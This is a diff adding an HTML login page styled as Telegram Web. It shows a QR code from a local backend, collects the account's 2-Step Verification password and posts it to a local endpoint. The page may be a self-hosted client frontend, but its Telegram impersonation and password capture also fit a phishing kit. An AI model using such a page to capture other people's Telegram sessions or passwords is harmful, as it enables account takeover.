@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Telegram Web Login</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, sans-serif;
+        background: #f1f1f1 url("https://web.telegram.org/img/bg_0.png");
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .card {
+        background: white;
+        width: 760px;
+        height: 480px;
+        border-radius: 12px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        display: none;
+        overflow: hidden;
+      }
+      .active {
+        display: flex !important;
+      }
+
+      /* QR Layout */
+      .left {
+        flex: 1;
+        padding: 60px 40px;
+        text-align: center;
+      }
+      .right {
+        flex: 1;
+        padding: 60px 40px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        border-left: 1px solid #eee;
+      }
+
+      /* Password Layout */
+      .pass-wrap {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+      }
+      input[type="password"] {
+        padding: 12px;
+        width: 200px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        margin: 15px 0;
+        outline: none;
+        transition: 0.2s;
+      }
+      input[type="password"]:focus {
+        border-color: #3390ec;
+      }
+      .btn {
+        background: #3390ec;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 6px;
+        cursor: pointer;
+      }
+
+      .logo {
+        width: 100px;
+        margin-bottom: 20px;
+      }
+      h1 {
+        font-size: 20px;
+        margin: 0 0 10px;
+      }
+      p {
+        color: #707579;
+        font-size: 14px;
+      }
+
+      .shake {
+        animation: shake 0.5s;
+        border-color: red !important;
+      }
+      @keyframes shake {
+        0% {
+          transform: translate(1px, 1px);
+        }
+        10% {
+          transform: translate(-1px, -2px);
+        }
+        20% {
+          transform: translate(-3px, 0px);
+        }
+        30% {
+          transform: translate(3px, 2px);
+        }
+        40% {
+          transform: translate(1px, -1px);
+        }
+        50% {
+          transform: translate(-1px, 2px);
+        }
+        60% {
+          transform: translate(-3px, 1px);
+        }
+        70% {
+          transform: translate(3px, 1px);
+        }
+        80% {
+          transform: translate(-1px, -1px);
+        }
+        90% {
+          transform: translate(1px, 2px);
+        }
+        100% {
+          transform: translate(1px, -2px);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- LOGIN SCREEN -->
+    <div class="card active" id="loginCard">
+      <div class="left">
+        <svg class="logo" viewBox="0 0 50 50">
+          <circle cx="25" cy="25" r="25" fill="#3390EC" />
+          <path
+            d="M37 15L13 24L19 41L23 35L33 21L21 34L25 38L37 15Z"
+            fill="white"
+          />
+        </svg>
+        <h1>Log in to Telegram</h1>
+        <p>1. Open Telegram on your phone</p>
+        <p>2. Go to Settings > Devices > Link Desktop Device</p>
+      </div>
+      <div class="right">
+        <div id="qrcode"></div>
+        <p id="statusText" style="margin-top: 20px">Loading...</p>
+      </div>
+    </div>
+
+    <!-- PASSWORD SCREEN -->
+    <div class="card" id="passwordCard">
+      <div class="pass-wrap">
+        <svg class="logo" viewBox="0 0 50 50">
+          <circle cx="25" cy="25" r="25" fill="#3390EC" />
+          <path
+            d="M36 21h-2v-2c0-5-4-9-9-9s-9 4-9 9v2h-2c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h22c1.1 0 2-.9 2-2V23c0-1.1-.9-2-2-2zm-11-2c0-3.9 3.1-7 7-7s7 3.1 7 7v2H25v-2z"
+            fill="white"
+          />
+        </svg>
+        <h1>Enter Password</h1>
+        <p>Your account is protected with 2-Step Verification.</p>
+        <input type="password" id="passInput" placeholder="Password" />
+        <div
+          style="height: 20px; color: red; font-size: 12px"
+          id="passError"
+        ></div>
+        <button class="btn" onclick="submitPass()">Next</button>
+      </div>
+    </div>
+
+    <!-- SUCCESS SCREEN -->
+    <div class="card" id="successCard">
+      <div class="pass-wrap">
+        <div
+          style="
+            width: 100px;
+            height: 100px;
+            background: #3390ec;
+            border-radius: 50%;
+            color: white;
+            font-size: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+          "
+          id="userIcon"
+        >
+          ?
+        </div>
+        <h1 id="welcomeMsg" style="margin-top: 20px">Welcome!</h1>
+        <button
+          class="btn"
+          style="background: #d32f2f; margin-top: 20px"
+          onclick="logout()"
+        >
+          Logout
+        </button>
+      </div>
+    </div>
+
+    <script>
+      let polling = true;
+      let currentQR = "";
+
+      // 1. Kickstart
+      fetch("/api/login");
+      setInterval(poll, 1000);
+
+      function poll() {
+        if (!polling) return;
+
+        fetch("/api/poll")
+          .then((r) => r.json())
+          .then((data) => {
+            handleState(data);
+          });
+      }
+
+      function handleState(data) {
+        const state = data.state;
+
+        // 1. QR Logic
+        if (state === "QR_SCAN") {
+          show("loginCard");
+          if (data.qr && data.qr !== currentQR) {
+            currentQR = data.qr;
+            document.getElementById("qrcode").innerHTML = "";
+            new QRCode(document.getElementById("qrcode"), {
+              text: data.qr,
+              width: 220,
+              height: 220,
+            });
+            document.getElementById("statusText").innerText =
+              "Scan image to log in";
+          }
+        }
+
+        // 2. Password Logic
+        else if (state === "PASSWORD_REQUIRED") {
+          show("passwordCard");
+          document.getElementById("passInput").classList.remove("shake");
+          document.getElementById("passError").innerText = "";
+        }
+
+        // 3. Wrong Password
+        else if (state === "PASSWORD_WRONG") {
+          show("passwordCard");
+          let input = document.getElementById("passInput");
+          if (!input.classList.contains("shake")) {
+            input.classList.add("shake");
+            document.getElementById("passError").innerText = "Invalid Password";
+          }
+        }
+
+        // 4. Success
+        else if (state === "LOGGED_IN") {
+          show("successCard");
+          polling = false;
+          if (data.user) {
+            console.log(data);
+
+            document.getElementById("welcomeMsg").innerText =
+              "Welcome, " + data.user.FirstName;
+            document.getElementById("userIcon").innerText =
+              data.user.FirstName.charAt(0);
+          }
+        }
+      }
+
+      function submitPass() {
+        const pass = document.getElementById("passInput").value;
+        fetch("/api/password", {
+          method: "POST",
+          body: JSON.stringify({ password: pass }),
+        });
+        // Clear input locally to prevent double submit
+        document.getElementById("passInput").value = "";
+      }
+
+      function logout() {
+        fetch("/api/logout").then(() => window.location.reload());
+      }
+
+      function show(id) {
+        document
+          .querySelectorAll(".card")
+          .forEach((c) => c.classList.remove("active"));
+        document.getElementById(id).classList.add("active");
+      }
+    </script>
+  </body>
+</html>
